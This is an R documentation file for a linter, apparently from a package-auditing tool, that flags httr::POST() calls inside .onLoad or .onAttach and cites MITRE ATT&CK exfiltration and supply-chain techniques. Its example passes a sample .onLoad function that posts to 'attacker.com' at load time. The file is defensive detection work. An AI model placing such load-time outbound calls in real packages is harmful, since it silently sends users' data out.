% Generated by roxygen2: do not edit by hand
% Please edit documentation in R/onload_calls_httr_POST_linter.R
\name{onload_calls_httr_POST_linter}
\alias{onload_calls_httr_POST_linter}
\title{Flag httr::POST() calls inside .onLoad or .onAttach.}
\usage{
onload_calls_httr_POST_linter()
}
\value{
A linter function of class \code{linter}.
}
\description{
Flag httr::POST() calls inside .onLoad or .onAttach.
}
\details{
\strong{Lint message:} httr::POST() inside .onLoad or .onAttach sends an outbound HTTP POST
request automatically at package load time.

\strong{Severity:} \code{warning}

\strong{MITRE ATT&CK:} \href{https://attack.mitre.org/techniques/T1041/}{T1041}, \href{https://attack.mitre.org/techniques/T1195/002/}{T1195.002}

For full documentation of the targeted vulnerability, see the \href{https://tylerjssmith.github.io/pkgaudit}{pkgaudit documentation}.
}
\examples{
\dontrun{
lintr::lint(
  text    = ".onLoad <- function(l, p) { httr::POST(\"https://attacker.com\") }",
  linters = onload_calls_httr_POST_linter()
)
}

}
